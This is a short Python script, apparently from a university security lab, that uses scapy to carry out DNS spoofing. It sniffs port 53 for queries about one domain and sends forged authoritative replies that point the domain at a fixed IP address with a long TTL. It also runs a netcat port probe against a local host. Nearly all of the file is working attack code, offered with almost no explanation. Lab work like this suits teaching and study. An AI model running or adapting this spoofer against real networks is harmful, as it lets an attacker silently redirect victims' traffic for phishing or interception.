from scapy.all import *
import sys
import os


localIP = '183.83.20.158'
domain = 'fakeme.seclab.cs.bonn.edu.'

def query_sniff(pkt):
    if DNS in pkt:
        #if DNS request
        if pkt[DNS].qr == 0 and pkt[DNS].qd.qname==domain:
	
            print str(pkt[IP].src) + " -> " + str(pkt[IP].dst) + " : request to: " + pkt[DNS].qd.qname
            #makes sense to print out UDP header also, as we also need ports for spoofing
            #pkt[UDP].show()
	    spoofed_pkt = (IP(src=pkt[IP].dst,dst=pkt[IP].src)/UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10000, rdata=localIP)))
            send(spoofed_pkt)
	    
	    print 'spoof try'

#sniffs packets and filters out UDP ones
os.system('netcat -z -v 10.0.0.5 5353')
sniff(filter="port 53",prn=query_sniff,count=100)

